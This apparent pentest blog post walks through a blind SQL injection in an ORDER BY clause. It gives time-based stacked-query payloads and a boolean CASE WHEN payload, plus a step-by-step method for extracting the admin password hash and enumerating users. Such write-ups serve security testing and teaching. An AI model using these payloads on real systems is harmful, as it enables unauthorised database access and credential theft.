---
layout: post
title: SQL Injection - ORDER BY (Blind)
---

### The story

On a recent blackbox engagement, I found a public facing website that contained an SQL injection vulnerability.  

"Easy win" I thought, let me just fire up `sqlmap` and see what I can access.  Unfortunately I would find out within the next 20 minutes, it's not going to be that easy.

`sqlmap` did pick up the same vulnerability I did, and figured out it needed some blind injection to make it work.  It could extract data like the database management system (MySQL) and the version, but it could not find anything else like database names, table names, etc.

I figured out why, and decided to just write up my own `python` script, instead of struggling to get `sqlmap` to work.  I think I spent about 10 minutes searching for a solution to get `sqlmap` to work, but didn't want this to end up being a rabbit hole, because there was quite a bit more to test.

### Vulnerable query

It helped me quite a bit that I could force an error in the statement, and because error reporting was turned on on the website, I was able to see the full query that failed.

I then knew the query looked like this:

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND ((published_at = 0) OR (published_at IS NULL) OR (published_at <= 1641945600)) AND ((unpublished_at = 0) OR (unpublished_at IS NULL) OR (unpublished_at >= 1641945600)) 
AND (`category_id`=15) 
ORDER BY status
```

The part that we can inject is right at the end, as our value we provide is used to populate `status`.

Let's just assume for the rest of this post that the statement is the following:

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY status
```

### Why blind?

The output was in JSON format, depending on what the initial query returned.  

As an example:

```json
[
    {
        "id":126,
        "title":"B",
        "status": 1
    },
    {
        "id":127,
        "title":"A",
        "status": 1
    }
]
```

For now I could just control the query in a few limited ways, but I couldn't manipulate the output JSON, yet.

For example:
```
`status` limit 1;
```

The resulting query:

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY `status` LIMIT 1;
```

Would return:
```json
[
    {
        "id":126,
        "title":"B",
        "status": 1
    }
]
```

Another example:
```
`title` limit 1;
```

The resulting query:

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY `title` LIMIT 1;
```


Would return:
```json
[
    {
        "id":127,
        "title":"A",
        "status": 1
    }
]
```

### First attempt (stacked and blind - timed)

It's easy to see we can inject stacked queries by just making use of the semi-colon `;` after each query.

An example:
```
`status`; SELECT (SELECT CASE WHEN (user() LIKE "w%") THEN sleep(5) ELSE 1 END);
```

This worked, because it turned the query into this (reformatted to make it more readable):

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY `status`;

SELECT (SELECT CASE WHEN (user() LIKE "w%") THEN sleep(5) ELSE 1 END);
```

\* *A bit more on why I used CASE instead of IF later in the post*

The output we received did not change though, because it was using the first query to obtain the values for the JSON output.

#### How does blind - timed SQL injection work?

What the previously query would do is if the MySQL user starts with a `w`, it will wait (sleep) 5 seconds, before giving the control back to the HTTP request.  All we do is work out the duration between the request that we sent, and the response that we receive.  If it takes longer than a normal request, we know that it does start with a `w`, and if it responds within the normal duration, we know that it doesn't start with a `w`.  

Once we know the `w` is what the it starts with, we start looking for the next character in the alphabet, and checking if it's valid following the same method.

For example, we'll search for `we`:
```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY `status`;

SELECT (SELECT CASE WHEN (user() LIKE "we%") THEN sleep(5) ELSE 1 END);
```

Using this method we would go ahead and brute force entries, to see if we can determine a valid entry.  We might end with something like `webuser` when we are done.

### The problem

As you can imagine, this can take extremely long to do because you run through all possible valid characters for each position until you find a valid one, and then start checking for the next character.  There is a lot of research that has been done on how to improve on this brute forcing, but I won't be getting into that.

With this engagement, the HTTP server was quite unreliable.  For normal queries the response was sometimes up to 8 seconds.  Which meant I had to put my `sleep` value to 15 seconds, and in my code have to check for anything from 20 seconds onwards to determine a valid character.

It would take me days, if not weeks to exiltrate just valid table names and column names.

### My next try

Normally it would be sufficient to display that we can access the database content, and report that as a finding.  As this was a blackbox engagement, my goal was to retrieve details from the database that would allow me to gain entry elsewhere, gain some form of privilege escalation or check for password re-use in other services.

I set my goal back onto getting the SQL injection to work by injecting the ORDER BY section with something that would still give me a result on screen.

I did some research, and eventually found this note on 
[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind-sql-injection-in-order-by-clause-using-a-binary-query-and-regexp):

> This query basically orders by one column or the other, depending on whether the EXISTS() returns a 1 or not. For the EXISTS() function to return a 1, the REGEXP query needs to match up, this means you can bruteforce blind values character by character and leak data from the database without direct output.

The way that is was explained here, instantly lead me to understand what I needed to do here.

If I can put it in a different way, can control what column the ORDER BY is going to used, based on a condition.  If the condition is true, we can sort it by `id` and if it is false we can sort it by `title`.  

Something like the following payload:

```
(SELECT IF(1=1, id, title))
```

Would produce a query like:

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY (SELECT IF(1=1, id, title));
```

For some reason, I had issues with using the IF() in this specific query once I tested this on the actual server.  It was working locally, but I couldn't figure out why the IF() statement wasn't working as expected.  

\* *Later on I noticed there was some form of sanitisation happening from the framework that they used to develop the web application.*

I opted to adjust it to make use of the CASE..WHEN..END functionality.

I adjusted the payload to the following:

```
(SELECT CASE WHEN (1=1) THEN id ELSE title END)
```

Would produce a query like:

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY (SELECT CASE WHEN (1=1) THEN id ELSE title END);
```

Testing it like this, I was able to know that when `id=126` is observed in the response JSON, the condition we are testing is `TRUE` because we are then sorting by `id`.  If `id=127` is observed, we know that the condition is `FALSE`, because then we are sorting by `title`.

Now we have a way to do our bruteforcing but without having to depend on a time delay.  This would go a lot quicker.

### Another condition to check

I noticed that in some cases a MySQL error (`Subquery returns more than 1 row`) was also generated.  The reason this happens is because if you are using a SELECT statement in your condition that you are checking you might find that more than one rows matches your check.  

Let's take an example of the following payload that checks for usernames:

```
(SELECT CASE WHEN (SELECT 1 FROM users WHERE username like 'a%') THEN id ELSE title END)
```

The resulting query is:

```
SELECT * FROM `article` 
WHERE (`status`=1) 
AND (`category_id`=15) 
ORDER BY (SELECT CASE WHEN (SELECT 1 FROM users WHERE username like 'a%') THEN id ELSE title END);
```

What could happen is that you have multiple users that have a username that starts with `a`, the check would return multiple rows, instead of just a single one that CASE is expecting.  

In my case, this also meant that the condition would be `TRUE`, and I included this error check in my script.

### Streamlining even further

I noticed that with each query, I would have to wait on a 42kb response from the server, because each time it was returning all the articles (and their complete objects) that it could find.  

I adjusted the payload so that we limited the results to only one.

The adjusted payload looked like this:
```
(SELECT CASE WHEN (1=1) THEN id ELSE title END) limit 1
```

This resulted in the bruteforcing going a lot quicker.

### The final solution

To obtain the `admin` password hash, I used the following methodology in my script:

1.  Generate a list of valid chars (a-zA-Z0-9)
2.  Run through the list of characters and check if `password_hash` starts with this letter
3.  My checks include seeing if `id=126` or if an MySQL error of `Subquery returns more than 1 row` is returned
4.  If we find a valid character, we record it
5.  We adjust our payload to start searching for the next character (i.e. `pa%`) and that going throught the valid chars checking
6.  Repeat the above until no valid chars are found anymore, indicating that we have reached the complete `password_hash`

Here is the payload I used in my script:
```
(SELECT CASE WHEN (SELECT 1 FROM users WHERE password_hash like 'a%' AND username='admin') THEN id ELSE title END) limit 1
```
 
### Closing notes

In order to not just have this limited to `admin`, I adjusted the script to filter out values I had already found and let it enumerate through all users first, and then enumerate to obtain their password hashes.  

I did test OOB techniques because I had stacked queries here, as well as reading and writing to files.  Unfortunately this instance was setup on AWS RDS, which seems to have been setup to restrict a lot of advanced features.  I didn't spend too much time on this, because I figured that even if I was able to write files (PHP script) for example, I wouldn't be able to trigger it because I had no way of reaching the files through a web server.

I suspect that in order to use sqlmap for this, I would need to figure out how to use --suffix and --prefix properly.  Although I love sqlmap, the developer in me always wants to come up with my own solutions.